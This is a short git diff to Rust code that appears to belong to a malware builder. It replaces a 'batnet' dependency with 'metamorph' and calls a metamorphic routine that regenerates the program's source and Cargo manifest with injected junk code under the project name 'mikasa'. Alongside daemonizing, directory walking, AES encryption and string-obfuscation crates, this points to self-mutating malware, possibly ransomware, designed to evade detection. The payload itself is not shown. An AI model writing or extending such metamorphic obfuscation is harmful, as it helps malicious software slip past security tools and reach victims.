@@ -16,6 +16,7 @@ use eframe::{App, Frame};
 use walkdir::WalkDir;
 
 use epaint::{CornerRadius, Margin};
+use metamorph;
 
 #[cfg(unix)]
 use daemonize::Daemonize;
@@ -292,20 +293,20 @@ edition = "2024"
 
 [dependencies]
 aes-gcm = "0.10.3"
-batnet = "1.1.1"
+daemonize = "0.5.0"
 dirs = "6.0.0"
 eframe = "0.31.1"
 epaint = "0.31.1"
 litcrypt = "0.4.0"
+metamorph = "1.0.0"
 rand_core = "0.9.3"
 walkdir = "2.5.0"
-daemonize = "0.5.0"
 "#;
 
     let r_junk_code = 15;
     let r_project_name = "mikasa";
 
-    batnet::metamorphic(r_source_code, r_toml, r_junk_code, r_project_name)?;
+    metamorph::morph(r_source_code, r_toml, r_junk_code, r_project_name)?;
     Ok(())
 }
 // METAMORPHIC_MARKER_END
